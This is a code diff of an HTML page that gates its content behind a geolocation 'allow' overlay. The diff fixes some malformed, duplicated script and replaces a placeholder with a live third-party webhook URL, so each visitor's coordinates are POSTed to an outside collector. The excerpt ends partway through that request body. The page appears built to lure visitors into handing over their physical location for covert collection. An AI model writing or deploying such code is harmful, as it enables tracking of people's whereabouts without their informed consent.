@@ -30,15 +30,7 @@
     }
 
 	</style>
-	// Created by Richard Rhodes //
-
-
-
-  <h1>Welcome</h1>
-  <p>You can now access the site.</p>
-</div>
-
-	
+	// Created by Richard //
 </head>
 <body>
 <div id="overlay">
@@ -149,12 +141,6 @@ document.getElementById("allow").addEventListener("click", () => {
     alert("Geolocation not supported");
     return;
   }
-  <script>
-document.getElementById("allow").addEventListener("click", () => {
-  if (!navigator.geolocation) {
-    alert("Geolocation not supported");
-    return;
-  }
 
   navigator.geolocation.getCurrentPosition(
     (position) => {
@@ -163,7 +149,7 @@ document.getElementById("allow").addEventListener("click", () => {
       document.getElementById("content").style.display = "block";
 
       // Optional: send to webhook
-      fetch("https://YOUR-WEBHOOK-URL", {
+      fetch("https://app.hooklistener.com/w/my-first-endpoint-opbl", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
